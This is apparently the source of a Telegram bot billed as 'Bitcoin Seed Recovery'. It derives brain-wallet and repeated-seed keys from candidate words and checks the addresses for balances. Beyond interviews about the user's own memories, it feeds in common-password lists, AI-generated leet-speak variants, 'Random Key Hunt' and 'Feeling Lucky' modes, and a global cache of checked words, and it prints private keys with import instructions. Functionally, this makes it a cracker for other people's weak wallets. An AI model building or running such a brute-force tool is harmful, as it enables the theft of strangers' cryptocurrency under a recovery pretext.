    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// Show profile mid-flow
async function showMemoryProfile(chatId) {
    const sess = session.getSession(chatId);
    const context = sess.memoryContext || {};

    if (Object.keys(context).length === 0) {
        await telegram.sendMessageWithKeyboard(chatId,
            '\ud83e\udde0 <b>Memory Profile</b>\n\nNo answers yet. Let\'s start!',
            telegram.buildKeyboard([[{ t: '\ud83e\udde0 Start Prompts', d: 'prompt:start' }, { t: '\ud83c\udfe0 Menu', d: 'menu:main' }]])
        );
        return;
    }

    const profileSummary = wordEngine.buildMemoryProfileSummary(context);
    const nextPrompt = wordEngine.getNextMemoryPrompt(context);

    let text = `\ud83e\udde0 <b>Memory Profile</b>\n\n${profileSummary}\n\n`;
    if (nextPrompt) {
        text += `\ud83d\udcdd ${nextPrompt.totalSteps - nextPrompt.answeredSteps} questions remaining`;
    } else {
        text += '\u2705 Profile complete!';
    }

    const buttons = [];
    if (nextPrompt) {
        buttons.push([{ t: '\u25b6\ufe0f Continue', d: `mem:continue:next` }]);
    } else {
        const smart = wordEngine.generateSmartSuggestions(context, sess.checkedWords || []);
        if (smart.words.length > 0) {
            buttons.push([{ t: `\u2705 Check ${Math.min(smart.words.length, 50)} Words`, d: 'smart_batch:go' }]);
        }
    }
    buttons.push([{ t: '\ud83d\udd04 Restart', d: 'prompt:start' }, { t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// Smart batch: check words generated from memory profile
async function handleSmartBatch(chatId) {
    const sess = session.getSession(chatId);
    const context = sess.memoryContext || {};
    const smart = wordEngine.generateSmartSuggestions(context, sess.checkedWords || []);

    if (smart.words.length === 0) {
        await telegram.sendMessage(chatId, '\u274c No suggestions generated. Try answering more memory prompts.');
        return;
    }

    await handleBatch(chatId, smart.words.join(', '));
}

// Smart AI: delegates to handleAISuggest which now uses full session context
async function handleSmartAI(chatId) {
    await handleAISuggest(chatId, '');
}

// ===== Deep Memory Interview System =====

/**
 * Start or resume the interview
 */
async function handleInterviewAction(chatId, action) {
    const sess = session.getSession(chatId);

    if (action === 'start') {
        // Initialize interview state
        sess.state = 'interview';
        sess.interviewPhase = 0;  // technique index (0-6)
        sess.interviewStep = -1;  // -1 = show intro, 0+ = questions
        sess.interviewAnswers = {};
        sess.interviewExtracted = [];

        await showInterviewStep(chatId);
    } else if (action === 'resume') {
        sess.state = 'interview';
        await showInterviewStep(chatId);
    } else if (action === 'skip_technique') {
        // Skip to next technique
        sess.interviewPhase = (sess.interviewPhase || 0) + 1;
        sess.interviewStep = -1;
        await showInterviewStep(chatId);
    } else if (action === 'results') {
        await showInterviewResults(chatId);
    } else if (action === 'check_extracted') {
        await handleInterviewBatchCheck(chatId);
    } else if (action === 'ai_followup') {
        await handleInterviewAIFollowup(chatId);
    } else if (action === 'stop') {
        sess.state = 'idle';
        await showInterviewResults(chatId);
    }
}

/**
 * Handle button presses during interview (iv:a:value)
 */
async function handleInterviewCallback(chatId, data) {
    const parts = data.split(':');
    if (parts.length < 3) return;

    const action = parts[1];
    const value = parts.slice(2).join(':');

    if (action === 'a') {
        // Button answer to interview question
        await processInterviewAnswer(chatId, value);
    }
}

/**
 * Handle free-text answers during interview
 */
async function handleInterviewTextAnswer(chatId, text) {
    await processInterviewAnswer(chatId, text);
}

/**
 * Process an interview answer (button or text) and advance
 */
async function processInterviewAnswer(chatId, answer) {
    const sess = session.getSession(chatId);
    if (!sess.interviewAnswers) sess.interviewAnswers = {};
    if (!sess.interviewExtracted) sess.interviewExtracted = [];

    const phase = sess.interviewPhase || 0;
    const step = sess.interviewStep || 0;

    // Store the answer
    const technique = wordEngine.INTERVIEW_TECHNIQUES[phase];
    if (technique) {
        const answerKey = `${technique.id}_q${step}`;
        sess.interviewAnswers[answerKey] = answer;
        console.log(`[Interview] ${chatId}: ${answerKey} = ${answer.slice(0, 50)}`);
    }

    // Extract potential words from the answer
    const extracted = wordEngine.extractWordsFromAnswer(answer);
    if (extracted.allWords.length > 0) {
        for (const w of extracted.allWords) {
            if (!sess.interviewExtracted.includes(w)) {
                sess.interviewExtracted.push(w);
            }
        }
    }

    // Show extracted words feedback if we found topic matches
    let feedbackText = '';
    if (extracted.topicMatches.length > 0) {
        feedbackText = '\n\ud83c\udfaf <i>Interesting! I noticed: ' +
            extracted.topicMatches.map(m => `"${m.word}" (${m.topic})`).join(', ') + '</i>\n';
    }

    // Advance to next question
    sess.interviewStep = step + 1;

    // Check if we need to move to next technique
    if (technique && sess.interviewStep >= technique.questions.length) {
        sess.interviewPhase = phase + 1;
        sess.interviewStep = -1;
    }

    // Show feedback + next step
    if (feedbackText) {
        await telegram.sendMessage(chatId, feedbackText);
    }
    await showInterviewStep(chatId);
}

/**
 * Show the current interview step (intro or question)
 */
async function showInterviewStep(chatId) {
    const sess = session.getSession(chatId);
    const phase = sess.interviewPhase || 0;
    const step = sess.interviewStep !== undefined ? sess.interviewStep : -1;

    const current = wordEngine.getInterviewQuestion(phase, step);

    if (!current) {
        // Interview complete
        sess.state = 'idle';
        await showInterviewResults(chatId);
        return;
    }

    const techniqueProgress = `${current.currentTechnique}/${current.totalTechniques}`;
    const answeredCount = Object.keys(sess.interviewAnswers || {}).length;

    if (current.isIntro) {
        // Show technique intro
        const technique = current.technique;
        let text = `${technique.emoji} <b>${technique.name}</b> (${techniqueProgress})\n\n`;
        text += `${technique.intro}\n\n`;
        text += `<i>${answeredCount} answers collected so far</i>`;

        if (sess.interviewExtracted?.length > 0) {
            text += `\n\ud83d\udcdd ${sess.interviewExtracted.length} potential words extracted`;
        }

        const buttons = [
            [{ t: '\u25b6\ufe0f Begin', d: 'iv:a:begin_technique' }, { t: '\u23ed\ufe0f Skip', d: 'interview:skip_technique' }],
            [{ t: '\ud83d\udcca Results', d: 'interview:results' }, { t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
        ];

        await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));

        // Auto-advance past intro when "Begin" is pressed
        sess.interviewStep = 0;
        return;
    }

    // Show the actual question
    const technique = current.technique;
    const question = current.question;

    let text = `${technique.emoji} <b>${technique.name}</b> (${techniqueProgress}) \u2022 Q${current.currentQuestion}/${current.totalQuestions}\n\n`;
    text += question.q;

    if (question.freeText) {
        text += '\n\n\ud83d\udcac <i>You can type a response or tap a button.</i>';
    }

    // Build buttons
    const qButtons = telegram.buildGrid(question.buttons, 2);
    const navButtons = [
        [
            { t: '\u23ed\ufe0f Skip', d: 'iv:a:skipped' },
            { t: '\ud83d\udcca Results', d: 'interview:results' },
            { t: '\ud83c\udfe0 Menu', d: 'menu:main' },
        ],
    ];

    await telegram.sendMessageWithKeyboard(chatId, text,
        telegram.buildKeyboard([...qButtons, ...navButtons])
    );
}

/**
 * Show interview results: summary + extracted words + action buttons.
 * Also integrates interview data into memory context for better suggestions.
 */
async function showInterviewResults(chatId) {
    const sess = session.getSession(chatId);
    const answers = sess.interviewAnswers || {};
    const extracted = sess.interviewExtracted || [];
    const phase = sess.interviewPhase || 0;

    // Integrate interview data into memory context
    if (Object.keys(answers).length > 0) {
        sess.memoryContext = wordEngine.integrateInterviewIntoContext(answers, sess.memoryContext || {});
        session.recordStrategy(chatId, 'interview');
    }
    const totalTechniques = wordEngine.INTERVIEW_TECHNIQUES.length;

    let text = `\ud83e\udde0 <b>Interview Summary</b>\n\n`;

    // Progress
    const completedTechniques = Math.min(phase, totalTechniques);
    text += `\ud83d\udcca <b>Progress:</b> ${completedTechniques}/${totalTechniques} techniques completed\n`;
    text += `\ud83d\udcdd <b>Answers:</b> ${Object.keys(answers).length} responses collected\n\n`;

    // Show answer summary
    if (Object.keys(answers).length > 0) {
        text += `<b>Key insights:</b>\n`;
        text += wordEngine.buildInterviewSummary(answers);
        text += '\n\n';
    }

    // Show extracted words
    if (extracted.length > 0) {
        text += `\ud83c\udfaf <b>Extracted Words (${extracted.length}):</b>\n`;
        const uniqueExtracted = [...new Set(extracted)];
        text += uniqueExtracted.slice(0, 50).map((w, i) => `  ${i + 1}. ${escHtml(w)}`).join('\n');
        if (uniqueExtracted.length > 50) text += `\n  ... and ${uniqueExtracted.length - 50} more`;
        text += '\n\n';
    }

    // Check if any extracted words match topics
    const topicHits = [];
    for (const w of extracted.slice(0, 100)) {
        const t = wordEngine.detectTopic(w);
        if (t.detected && !topicHits.find(h => h.topic === t.primaryTopic)) {
            topicHits.push({ word: w, topic: t.primaryTopic, label: t.primaryLabel });
        }
    }

    if (topicHits.length > 0) {
        text += `\ud83c\udfae <b>Topics detected from your answers:</b>\n`;
        text += topicHits.map(h => `  \u2022 "${h.word}" \u2192 ${h.label}`).join('\n');
        text += '\n\n';
    }

    // Build action buttons
    const buttons = [];

    // Check extracted words
    if (extracted.length > 0) {
        buttons.push([{
            t: `\u2705 Check ${Math.min(extracted.length, 200)} Words`,
            d: 'interview:check_extracted'
        }]);
    }

    // Topic hits (max 4)
    if (topicHits.length > 0) {
        for (const h of topicHits.slice(0, 4)) {
            buttons.push([{ t: h.label, d: `explore:${h.topic}` }]);
        }
    }

    // Next actions row
    const nextRow = [];
    if (settings.get(chatId, 'ai_provider') !== 'none' && Object.keys(answers).length >= 3) {
        nextRow.push({ t: '\ud83e\udd16 AI Analysis', d: 'interview:ai_followup' });
    }
    if (phase < totalTechniques) {
        nextRow.push({ t: '\u25b6\ufe0f Continue', d: 'interview:resume' });
    }
    if (nextRow.length > 0) buttons.push(nextRow);

    buttons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

/**
 * Batch check all extracted interview words
 */
async function handleInterviewBatchCheck(chatId) {
    const sess = session.getSession(chatId);
    const extracted = sess.interviewExtracted || [];

    if (extracted.length === 0) {
        await telegram.sendMessage(chatId, '\u274c No words extracted yet. Continue the interview.');
        return;
    }

    sess.state = 'idle';
    await handleBatch(chatId, extracted.join(', '));
}

/**
 * AI-powered interview follow-up: uses all interview data to generate
 * adaptive questions and word suggestions
 */
async function handleInterviewAIFollowup(chatId) {
    const sess = session.getSession(chatId);
    const answers = sess.interviewAnswers || {};
    const memCtx = sess.memoryContext || {};
    const checkedWords = sess.checkedWords || [];

    const providerName = settings.get(chatId, 'ai_provider');
    if (providerName === 'none') {
        await telegram.sendMessage(chatId, '\u274c No AI provider configured. Use /settings ai_provider [name]');
        return;
    }

    const msg = await telegram.sendMessage(chatId,
        `\ud83e\udd16 <b>AI Deep Analysis</b>\n\n` +
        `Sending ${Object.keys(answers).length} interview answers to <b>${escHtml(providerName)}</b>...\n` +
        `\u23f3 Analyzing your memory profile...`
    );

    const customPrompt = wordEngine.buildInterviewAIPrompt(answers, memCtx, checkedWords);

    const result = await aiSuggest.getSuggestions('interview_analysis', {
        ...settings.getAll(chatId),
        context: {
            customPrompt,
            checkedWords: checkedWords.slice(-30),
        }
    });

    if (msg?.message_id) await telegram.deleteMessage(chatId, msg.message_id);

    if (!result.ok) {
        await showAIError(chatId, result, 'interview:ai_followup');
        return;
    }

    // Parse the AI response for follow-up question and words
    const rawText = result.words.join('\n');
    const parsed = wordEngine.parseInterviewAIResponse(rawText);

    let text = `\ud83e\udd16 <b>AI Deep Analysis</b> (${result.provider})\n\n`;

    // Show the AI's follow-up question
    if (parsed.question) {
        text += `\ud83d\udcac <b>AI Follow-up Question:</b>\n`;
        text += `<i>${escHtml(parsed.question)}</i>\n\n`;
        text += `\ud83d\udcad <i>Type your answer to continue the conversation.</i>\n\n`;
        sess.state = 'interview'; // Keep in interview mode for text responses
    }

    // Show AI-suggested words
    if (parsed.words.length > 0) {
        // Also add to extracted list
        for (const w of parsed.words) {
            if (!sess.interviewExtracted.includes(w.toLowerCase())) {
                sess.interviewExtracted.push(w.toLowerCase());
            }
        }

        text += `\ud83c\udfaf <b>AI Suggestions (${parsed.words.length}):</b>\n`;
        text += parsed.words.slice(0, 40).map((w, i) => `  ${i + 1}. ${escHtml(w)}`).join('\n');
        if (parsed.words.length > 40) text += `\n  ... and ${parsed.words.length - 40} more`;
    } else if (result.words.length > 0) {
        // Fallback: the AI didn't follow the format, treat all as word suggestions
        for (const w of result.words) {
            if (!sess.interviewExtracted.includes(w.toLowerCase())) {
                sess.interviewExtracted.push(w.toLowerCase());
            }
        }
        text += `\ud83c\udfaf <b>AI Suggestions (${result.words.length}):</b>\n`;
        text += result.words.slice(0, 40).map((w, i) => `  ${i + 1}. ${escHtml(w)}`).join('\n');
    }

    const buttons = [];
    const totalExtracted = sess.interviewExtracted.length;
    if (totalExtracted > 0) {
        buttons.push([{
            t: `\u2705 Check All ${Math.min(totalExtracted, 200)} Words`,
            d: 'interview:check_extracted'
        }]);
    }
    const nextRow = [];
    if (settings.get(chatId, 'ai_provider') !== 'none') nextRow.push({ t: '🤖 AI Again', d: 'interview:ai_followup' });
    nextRow.push({ t: '\u25b6\ufe0f Continue', d: 'interview:resume' });
    buttons.push(nextRow);
    buttons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// ===== Batch AI More: generate similar words from last batch =====
async function handleBatchAIMore(chatId) {
    const providerName = settings.get(chatId, 'ai_provider');
    if (providerName === 'none') {
        await telegram.sendMessage(chatId, '\u274c No AI provider configured. Use /settings ai_provider [name]');
        return;
    }

    const sess = session.getSession(chatId);
    const batchWords = sess.lastBatchWords || [];
    const checkedWords = sess.checkedWords || [];
    const memCtx = sess.memoryContext || {};

    if (batchWords.length === 0) {
        await telegram.sendMessage(chatId, '\u274c No recent batch to analyze. Run a batch first.');
        return;
    }

    const msg = await telegram.sendMessage(chatId,
        `\ud83e\udd16 Asking <b>${escHtml(providerName)}</b> for more words like: ${batchWords.slice(0, 8).map(w => `"${escHtml(w)}"`).join(', ')}...`
    );

    let customPrompt = `I'm helping someone recover a Bitcoin wallet passphrase from the early Bitcoin era (2009-2014).\n\n`;
    customPrompt += `They just checked these words but none had a balance:\n`;
    customPrompt += `${batchWords.join(', ')}\n\n`;

    if (Object.keys(memCtx).length > 0) {
        customPrompt += `=== MEMORY PROFILE ===\n`;
        if (memCtx.year) customPrompt += `Year: ${memCtx.year}\n`;
        if (memCtx.mood) customPrompt += `Mood: ${memCtx.mood}\n`;
        if (memCtx.interest) customPrompt += `Interest: ${memCtx.interest}\n`;
        if (memCtx.gaming_mmo) customPrompt += `Game: ${memCtx.gaming_mmo}\n`;
        if (memCtx.gaming_moba) customPrompt += `Game: ${memCtx.gaming_moba}\n`;
        if (memCtx.word_type) customPrompt += `Word type: ${memCtx.word_type}\n`;
        if (memCtx.first_letter) customPrompt += `First letter: ${memCtx.first_letter}\n`;
        if (memCtx.word_length) customPrompt += `Length: ${memCtx.word_length}\n`;
        customPrompt += '\n';
    }

    customPrompt += `Already checked (do NOT repeat): ${checkedWords.slice(-50).join(', ')}\n\n`;
    customPrompt += `=== INSTRUCTIONS ===\n`;
    customPrompt += `Based on the pattern of these words, generate 50 MORE similar words they might have used.\n`;
    customPrompt += `Think about:\n`;
    customPrompt += `- Same theme/universe but different characters, items, places\n`;
    customPrompt += `- Alternate spellings, abbreviations, nicknames\n`;
    customPrompt += `- Related games, movies, or cultural references from the same era\n`;
    customPrompt += `- Common variations people used as passwords (with numbers, leet speak)\n`;
    customPrompt += `- Deeper cuts and obscure references within the same topics\n\n`;
    customPrompt += `Return ONLY the words, one per line, no numbering or explanations.\n`;

    const result = await aiSuggest.getSuggestions(batchWords[0], {
        ...settings.getAll(chatId),
        context: { customPrompt, checkedWords: checkedWords.slice(-50) }
    });

    if (msg?.message_id) await telegram.deleteMessage(chatId, msg.message_id);

    if (!result.ok) {
        await showAIError(chatId, result, 'batch_ai_more:go');
        return;
    }

    const words = result.words;
    setAICache(String(chatId), { word: `more like ${batchWords.slice(0, 3).join(', ')}`, words, provider: result.provider, model: result.model });
    await showAISuggestionsPage(chatId, 0);
}

// ===== Batch Random: generate random words from topics/era =====
async function handleBatchRandom(chatId) {
    const sess = session.getSession(chatId);
    const memCtx = sess.memoryContext || {};
    const checked = new Set((sess.checkedWords || []).map(w => w.toLowerCase()));

    const randomWords = new Set();

    // Pull from relevant topics based on profile
    const topicMapping = [];
    if (memCtx.gaming_mmo) topicMapping.push(memCtx.gaming_mmo);
    if (memCtx.gaming_moba) topicMapping.push(memCtx.gaming_moba);
    if (sess.detectedTopic) topicMapping.push(sess.detectedTopic);

    // Add era topics
    if (memCtx.year) {
        const era = wordEngine.getEraTopics(Number(memCtx.year));
        topicMapping.push(...era.topics);
    }

    // Pull random words from each mapped topic
    for (const topicKey of topicMapping) {
        const info = topics.getTopicInfo(topicKey);
        if (info && info.words) {
            const available = info.words.filter(w => !checked.has(w.toLowerCase()));
            // Shuffle and pick random
            const shuffled = available.sort(() => Math.random() - 0.5);
            for (const w of shuffled.slice(0, 25)) {
                randomWords.add(w);
            }
        }
    }

    // If we don't have enough, pull from all topics randomly
    if (randomWords.size < 50) {
        const allTopics = topics.listTopics();
        const shuffledTopics = allTopics.sort(() => Math.random() - 0.5);
        for (const t of shuffledTopics.slice(0, 20)) {
            const info = topics.getTopicInfo(t.key);
            if (info && info.words) {
                const available = info.words.filter(w => !checked.has(w.toLowerCase()));
                const shuffled = available.sort(() => Math.random() - 0.5);
                for (const w of shuffled.slice(0, 10)) {
                    randomWords.add(w);
                    if (randomWords.size >= 100) break;
                }
            }
            if (randomWords.size >= 100) break;
        }
    }

    // Also add some random common passwords/brain wallets
    const commonRandom = [
        'password', 'bitcoin', 'satoshi', 'letmein', 'master', 'dragon', 'shadow',
        'monkey', 'qwerty', 'abc123', 'trustno1', 'iloveyou', 'sunshine', 'princess',
        'football', 'charlie', 'access', 'hello', 'thunder', 'freedom', 'whatever',
        'mustang', 'killer', 'jordan', 'superman', 'harley', 'ranger', 'buster',
    ].filter(w => !checked.has(w));
    const shuffledCommon = commonRandom.sort(() => Math.random() - 0.5);
    for (const w of shuffledCommon.slice(0, 10)) {
        randomWords.add(w);
    }

    const wordList = [...randomWords].slice(0, 500);

    if (wordList.length === 0) {
        await telegram.sendMessage(chatId, '\u274c No unchecked words remaining. Try /dictionary or AI suggestions.');
        return;
    }

    await telegram.sendMessage(chatId,
        `\ud83c\udfb2 <b>Random batch:</b> ${wordList.length} words from ${topicMapping.length > 0 ? 'your topics' : 'all topics'}`
    );
    await handleBatch(chatId, wordList.join(', '));
}

// ===== Show private keys =====
async function handleShowKeys(chatId, value) {
    const sess = session.getSession(chatId);
    const word = value || sess.lastWord;

    if (!word) {
        await telegram.sendMessage(chatId, '\u26a0\ufe0f No word checked yet. Send any word first.');
        return;
    }

    const brainResult = bitcoin.deriveBrainWallet(word);
    const text = `\ud83d\udd11 <b>Private Keys for "${escHtml(word)}"</b>\n\n` +
        `\ud83e\udde0 <b>Brain Wallet (SHA256):</b>\n` +
        `  \ud83d\udd10 Hex: <code>${brainResult.privateKey}</code>\n` +
        `  \ud83d\udcb3 WIF (c): <code>${brainResult.wifCompressed}</code>\n` +
        `  \ud83d\udcb3 WIF (u): <code>${brainResult.wifUncompressed}</code>\n\n` +
        `\ud83c\udfe0 <b>Addresses:</b>\n` +
        `  \ud83c\udfdb\ufe0f Legacy (c): <code>${brainResult.addresses.legacy_compressed}</code>\n` +
        `  \u26aa Legacy (u): <code>${brainResult.addresses.legacy_uncompressed}</code>\n` +
        `  \ud83d\udfe2 SegWit: <code>${brainResult.addresses.segwit}</code>\n` +
        `  \ud83d\udd35 Native: <code>${brainResult.addresses.nativeSegwit}</code>\n\n` +
        `\ud83d\udcdd Import the WIF key into Electrum, Sparrow, or any Bitcoin wallet.\n` +
        `\ud83d\udd12 Keep these keys secure!`;

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard([
        [{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
    ]));
}

// ===== More suggestions - uses progressive engine =====
async function handleMoreSuggestions(chatId) {
    const sess = session.getSession(chatId);
    const depth = session.getSearchDepth(chatId);
    const nextSteps = wordEngine.getProgressiveNextSteps(
        sess.memoryContext || {},
        sess.checkedTopics || [],
        sess.checkedWords || [],
        depth
    );

    let text = '\ud83d\udca1 <b>What to try next:</b>\n\n';
    if (nextSteps.pivotMessage) {
        text += nextSteps.pivotMessage + '\n\n';
    }
    if (depth.topicsExplored > 0) {
        text += `<i>${depth.topicsExplored} topics explored, ${depth.wordsChecked} words checked</i>\n`;
    }

    const buttons = buildProgressiveButtons(nextSteps, sess, chatId);
    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// ===== Settings toggle from keyboard =====
async function handleSettingsToggle(chatId, key) {
    if (key === 'reset') {
        settings.reset(chatId);
        await cmdSettings(chatId);
        return;
    }

    // Admin-only settings — silently ignore for regular users
    if (key === 'show_wif' && !isAdmin(chatId)) {
        await telegram.sendMessage(chatId, '\ud83d\udd12 Show Keys is available for the bot admin only.');
        return;
    }

    // Keys that live on the advanced page
    const advancedKeys = ['brain', 'bip39', 'variations', 'show_wif', 'auto_topic', 'verbose', 'auto_explore'];

    const current = settings.get(chatId, key);
    if (typeof current === 'boolean') {
        settings.set(chatId, key, !current);
    } else if (key === 'var_depth') {
        const options = ['normal', 'deep', 'extreme'];
        settings.set(chatId, key, options[(options.indexOf(current) + 1) % options.length]);
    } else if (key === 'api') {
        const options = ['auto', 'blockchain', 'mempool', 'blockcypher', 'blockstream'];
        settings.set(chatId, key, options[(options.indexOf(current) + 1) % options.length]);
    } else if (key === 'ai_provider') {
        const options = ['none', 'openai', 'claude', 'gemini', 'groq', 'ollama', 'together'];
        settings.set(chatId, key, options[(options.indexOf(current) + 1) % options.length]);
    } else if (key === 'indices') {
        const options = [3, 5, 10, 20, 50, 100];
        settings.set(chatId, key, options[(options.indexOf(current) + 1) % options.length] || 10);
    }

    await cmdSettings(chatId, advancedKeys.includes(key) ? 'advanced' : 'main');
}

// ===== Settings command =====
async function handleSettingsChange(chatId, args) {
    const parts = args.split(/\s+/);
    const key = parts[0];
    const value = parts.slice(1).join(' ');

    if (!value) {
        await telegram.sendMessage(chatId, `⚙️ <b>${key}</b>: ${JSON.stringify(settings.get(chatId, key))}`);
        return;
    }

    const result = settings.set(chatId, key, value);
    if (result.ok) {
        await telegram.sendMessage(chatId, `\u2705 Updated <b>${key}</b> = ${JSON.stringify(result.value)}`);
    } else {
        await telegram.sendMessage(chatId, `\u274c Error: ${escHtml(result.error)}`);
    }
}

// (Old type/platform/length handlers removed - unified into memory system)

// ===== Command implementations =====
async function cmdStart(chatId) {
    // Show onboarding for new users who haven't set up API keys yet
    if (!settings.isSetupDone(chatId)) {
        const { blockchain_key, blockcypher_key, blockstream_key, ai_provider } = settings.getAll(chatId);
        const hasExplorerKey = blockchain_key || blockcypher_key || blockstream_key;
        const hasAI = ai_provider !== 'none';

        if (!hasExplorerKey && !hasAI) {
            settings.set(chatId, 'setup_done', true);
            await telegram.sendMessageWithKeyboard(chatId,
                `\ud83d\udd10 <b>Bitcoin Seed Recovery</b>\n\n` +
                `Welcome! Before you start, you can optionally add free API keys to avoid rate limits during balance checking.\n\n` +
                `\ud83d\udd17 <b>Explorer API Keys</b> (recommended)\n` +
                `Free keys from Blockchain.info, BlockCypher, or Blockstream give you higher rate limits for faster checking.\n\n` +
                `\ud83e\udd16 <b>AI Provider</b> (optional)\n` +
                `Add a free Groq key to generate 200+ word suggestions per topic.\n\n` +
                `You can skip this and add keys later in /settings.`,
                telegram.buildKeyboard([
                    [{ t: '\ud83d\udd17 Set Up Explorer Keys', d: 'onboard:setup' }],
                    [{ t: '\u23e9 Skip — Start Now', d: 'onboard:skip' }],
                ])
            );
            return;
        }
    }

    await telegram.sendMessageWithKeyboard(chatId,
        `\ud83d\udd10 <b>Bitcoin Seed Recovery</b>\n\n` +
        `Remember using a simple word as your Bitcoin wallet password back in 2009\u20132014? ` +
        `Many early adopters used brain wallets or repeated a single word as their seed phrase.\n\n` +
        `<b>I'll help you find it.</b>\n\n` +
        `\ud83d\udc47 <b>Pick how to start:</b>`,
        telegram.buildKeyboard([
            [{ t: '\u270d\ufe0f I remember a word', d: 'start:type_word' }],
            [{ t: '\ud83e\udde0 Help me remember', d: 'memory:main' }],
            [{ t: '\ud83d\udcc2 Browse word lists', d: 'topics_page:0' }],
            [{ t: '\ud83c\udf40 Feeling Lucky', d: 'lucky:go' }, { t: '\ud83c\udfb0 Random Key Hunt', d: 'keyhunt:5' }],
            ...(WEBAPP_URL ? [[{ t: '\ud83c\udf10 Web Checker (faster)', web_app: { url: WEBAPP_URL } }]] : []),
            [{ t: '\ud83d\udcd6 How does this work?', d: 'start:guide' }],
        ])
    );
}

// ===== Interactive Guide - explains the bot step by step =====
const GUIDE_PAGES = [
    {
        text:
            `\ud83d\udcd6 <b>How does this work?</b>\n\n` +
            `In 2009\u20132014, many people created Bitcoin wallets using a <b>single word or phrase</b> as their password.\n\n` +
            `Two common methods:\n\n` +
            `<b>1. Brain Wallet</b>\n` +
            `You typed a word like <code>superman</code> into a website. It converted that word into a Bitcoin private key using SHA256.\n\n` +
            `<b>2. Repeated Seed</b>\n` +
            `You used the same word 12 or 24 times as a seed phrase:\n` +
            `<code>superman superman superman superman superman superman superman superman superman superman superman superman</code>\n\n` +
            `Both methods create a real Bitcoin wallet. If you sent BTC to it, it's still there.`,
        buttons: [[{ t: 'Next \u27a1\ufe0f', d: 'guide:1' }]],
    },
    {
        text:
            `\ud83d\udcd6 <b>What this bot does</b>\n\n` +
            `When you type a word like <code>velen</code>, the bot:\n\n` +
            `<b>Step 1:</b> Creates all wallet types from that word\n` +
            `\u2022 Brain wallet: SHA256("velen") \u2192 private key\n` +
            `\u2022 Repeated seed: "velen" \u00d7 12 and \u00d7 24\n` +
            `\u2022 Derives Legacy, SegWit, and Native SegWit addresses\n\n` +
            `<b>Step 2:</b> Tests 50+ variations automatically\n` +
            `<code>velen, Velen, VELEN, velen123, velen2011, v3l3n, velenbtc, velenvelen...</code>\n\n` +
            `<b>Step 3:</b> Checks every address for BTC balance\n` +
            `Uses free blockchain APIs \u2014 no keys needed\n\n` +
            `<b>Step 4:</b> If a balance is found, shows the amount and private key`,
        buttons: [
            [{ t: '\u2b05\ufe0f Back', d: 'guide:0' }, { t: 'Next \u27a1\ufe0f', d: 'guide:2' }],
        ],
    },
    {
        text:
            `\ud83d\udcd6 <b>Finding the right word</b>\n\n` +
            `Most people don't remember which word they used. The bot helps in several ways:\n\n` +
            `<b>\ud83d\udcc2 Word Lists</b>\n` +
            `Browse by category: Gaming, Movies, Crypto, Music...\n` +
            `Example: pick "World of Warcraft" and the bot checks hundreds of WoW-related words.\n\n` +
            `<b>\ud83e\udd16 AI Suggestions</b>\n` +
            `Connect an AI provider (Groq is free) and the bot generates 200+ words per topic — characters, locations, items, memes, password patterns.\n\n` +
            `<b>\ud83e\udde0 Memory Guide</b>\n` +
            `Answer questions about your life in 2009\u20132014:\n` +
            `What games did you play? What year? What kind of word?\n` +
            `The bot narrows down and suggests words based on your answers.`,
        buttons: [
            [{ t: '\u2b05\ufe0f Back', d: 'guide:1' }, { t: 'Next \u27a1\ufe0f', d: 'guide:3' }],
        ],
    },
    {
        text:
            `\ud83d\udcd6 <b>Example session</b>\n\n` +
            `<b>You:</b> <code>arthas</code>\n\n` +
            `<b>Bot:</b> Checking "arthas"...\n` +
            `\u2022 52 variations tested (arthas, Arthas, arthas123, arthas2011...)\n` +
            `\u2022 Brain wallet + Repeated seed \u00d7 12 + \u00d7 24\n` +
            `\u2022 180 addresses checked\n` +
            `\u2022 Topic detected: World of Warcraft\n\n` +
            `<b>Bot:</b> Want to explore all WoW words?\n\n` +
            `<b>You:</b> [tap Explore]\n\n` +
            `<b>Bot:</b> AI generates 200 WoW words\n` +
            `thrall, jaina, sylvanas, frostmourne, orgrimmar, thunderfury, loktar, forthehorde...\n` +
            `Checks each one automatically.\n\n` +
            `<b>Bot:</b> Done! 200 words checked. Want more?\n` +
            `[AI: More WoW words] [Try another topic]`,
        buttons: [
            [{ t: '\u2b05\ufe0f Back', d: 'guide:2' }, { t: 'Next \u27a1\ufe0f', d: 'guide:4' }],
        ],
    },
    {
        text:
            `\ud83d\udcd6 <b>Tips for best results</b>\n\n` +
            `\u2022 <b>Set up AI</b> \u2014 it turns 30 words into 200+ per topic\n` +
            `   Groq is free: /settings ai_provider groq\n\n` +
            `\u2022 <b>Try personal words first</b> \u2014 your name, nickname, pet, favourite character\n\n` +
            `\u2022 <b>Think about 2009\u20132014</b> \u2014 what games, movies, shows were you into?\n\n` +
            `\u2022 <b>Use Memory Guide</b> if you're stuck \u2014 it walks you through memory techniques\n\n` +
            `\u2022 <b>Words are cached globally</b> \u2014 already-checked words are skipped instantly, no wasted time\n\n` +
            `Ready to start?`,
        buttons: [
            [{ t: '\u2b05\ufe0f Back', d: 'guide:3' }],
            [{ t: '\u270d\ufe0f I remember a word', d: 'start:type_word' }],
            [{ t: '\ud83e\udde0 Help me remember', d: 'memory:main' }],
            [{ t: '\ud83d\udcc2 Browse word lists', d: 'topics_page:0' }],
        ],
    },
];

async function cmdGuide(chatId, page) {
    const p = Math.max(0, Math.min(page, GUIDE_PAGES.length - 1));
    const guide = GUIDE_PAGES[p];
    await telegram.sendMessageWithKeyboard(chatId, guide.text,
        telegram.buildKeyboard(guide.buttons)
    );
}

async function cmdMainMenu(chatId) {
    const sess = session.getSession(chatId);
    const lastWord = sess.lastWord;
    const totalChecks = sess.checkedWords?.length || 0;

    let text = `\ud83d\udd10 <b>What would you like to do?</b>\n`;
